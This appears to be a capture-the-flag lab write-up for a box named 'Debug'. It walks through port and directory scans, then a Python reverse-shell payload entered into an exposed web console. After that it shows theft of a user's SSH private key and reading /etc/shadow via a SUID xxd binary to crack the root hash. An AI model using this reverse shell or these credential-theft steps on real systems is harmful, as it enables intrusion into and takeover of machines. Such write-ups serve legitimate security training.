@@ -1,0 +1,117 @@
+I"%<p>Debug is a fairly straightforward box. Getting user access is very easy, and upgrading to root privileges becomes pretty clear once you enumerate the box.
+<!--excerpt--></p>
+
+<h1 id="information-gathering">Information Gathering</h1>
+
+<h2 id="port-scan-nmap">Port Scan: nmap</h2>
+<p>We begin with a port scan of the box, checking all ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/debug<span class="nv">$ </span>nmap <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="nt">-A</span> <span class="nt">-oA</span> nmap/debug 172.31.1.5
+<span class="c"># Nmap 7.80 scan initiated Fri Apr 17 20:14:20 2020 as: nmap -T4 -p- -A -oA nmap/debug 172.31.1.5</span>
+Nmap scan report <span class="k">for </span>172.31.1.5
+Host is up <span class="o">(</span>0.049s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 9e:84:e4:df:52:83:55:3f:90:43:d1:8e:4a:18:8b:0c <span class="o">(</span>RSA<span class="o">)</span>
+|   256 f6:1a:89:b2:ca:57:7a:47:be:88:9b:3e:8f:e8:52:98 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 01:f2:94:0a:d3:54:52:15:87:ae:73:bc:4d:70:6e:90 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Future Design
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Fri Apr 17 20:14:48 2020 -- 1 IP address (1 host up) scanned in 28.08 seconds</span>
+</code></pre></div></div>
+<p>There are only two ports open: SSH and an Apache Webserver. Navigating to the website we see a simple webpage for a design company:</p>
+
+<p><img src="/assets/images/writeups/debug/index_html.png" alt="Future Designs" /></p>
+
+<p>Navigating around, each page seems to just be a static webpage, and the page source doesn’t give any interesting information. Next we run a <strong>gobuster</strong> scan.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/debug<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://172.31.1.5 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-t</span> 50
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://172.31.1.5
+<span class="o">[</span>+] Threads:        50
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/04/18 15:06:21 Starting gobuster
+<span class="o">===============================================================</span>
+/about <span class="o">(</span>Status: 200<span class="o">)</span>
+/contact <span class="o">(</span>Status: 200<span class="o">)</span>
+/blog <span class="o">(</span>Status: 200<span class="o">)</span>
+/services <span class="o">(</span>Status: 200<span class="o">)</span>
+/console <span class="o">(</span>Status: 200<span class="o">)</span>
+/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
+<span class="o">===============================================================</span>
+2020/04/18 15:10:10 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<p>We can access the first four pages from the website index directly and /server-status doesn’t load. The only interesting page is <strong>/console</strong>, which seems to be some kind of python interpreter.</p>
+
+<p><img src="/assets/images/writeups/debug/console_html.png" alt="/console" /></p>
+
+<p>We can use python module <strong>getpass</strong> to enumerate whether the console is being run locally in the browser or on the box itself, and if so, what user it is running under.</p>
+
+<p><img src="/assets/images/writeups/debug/getuser.png" alt="Enumerate User" /></p>
+
+<p>It seems the console is running as the user <strong>megan</strong> on the remote machine.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>From this point, getting a reverse shell is trivial. We set up a listener on our machine with <strong>nc -lvnp 4444</strong> and input the following commands to the python console:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">"10.0.0.1"</span><span class="p">,</span><span class="mi">4242</span><span class="p">))</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="kn">import</span> <span class="nn">pty</span>
+<span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">)</span>
+</code></pre></div></div>
+<blockquote>
+  <p>Note: The final command doesn’t show up in the console but <strong>usually</strong> stills spawns a shell</p>
+</blockquote>
+
+<p><img src="/assets/images/writeups/debug/reverse_shell.png" alt="Now we have access to the box" /></p>
+
+<h2 id="user-flag">User Flag</h2>
+<p>The reverse shell is very basic; there’s no tab completion, history, etc. We could upgrade the reverse shell, but navigating to <strong>/home/megan</strong> allows us to find a <strong>.ssh</strong> folder, with a private RSA key inside. We can copy this key to our local machine which will allows us to reconnect with a full shell.</p>
+
+<p><img src="/assets/images/writeups/debug/ssh_rsa.png" alt="SSH Key" /></p>
+
+<p><img src="/assets/images/writeups/debug/ssh_access.png" alt="SSH Access" /></p>
+<blockquote>
+  <p><em>Note: ssh.key is the same as id_rsa from the remote box</em></p>
+</blockquote>
+
+<h2 id="root-flag">Root Flag</h2>
+
+<p>Let’s run <strong><a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a></strong>. Set up an HTTP server on our local machine and use <strong>wget</strong> on the remote to download the shell file, which is then run with <strong>bash LinEnum.sh</strong>. Looking at the output, most of the box settings are standard, except there is one interesting SUID binary.</p>
+
+<p><img src="/assets/images/writeups/debug/suid_enum.png" alt="SUID" /></p>
+
+<p><strong>xxd</strong> is a program that can create a hexdump of a file or revert a hexdump back to its original form. Since xxd has SUID set and is owned by root, we can access files we usually don’t have permissions for, such as <strong>/etc/shadow</strong>.</p>
+
+<p><img src="/assets/images/writeups/debug/xxd.png" alt="xxd" /></p>
+
+<p>We can then take the root password hash and run it through <strong>hashcat</strong> on our local machine to hopefully crack the root user’s password. The beginning of the hash starts with $6$ which means it <strong>SHA-512</strong> hash.</p>
+
+<p><img src="/assets/images/writeups/debug/hashcat.png" alt="Cracking the password" /></p>
+
+<p>After it finishes, we see that the root password is <strong>shanghai</strong>. We can then <strong>su -</strong> to switch to the root user, supplying the password when asked.</p>
+
+<p><img src="/assets/images/writeups/debug/root.png" alt="Getting the root flag" /></p>
+:ET
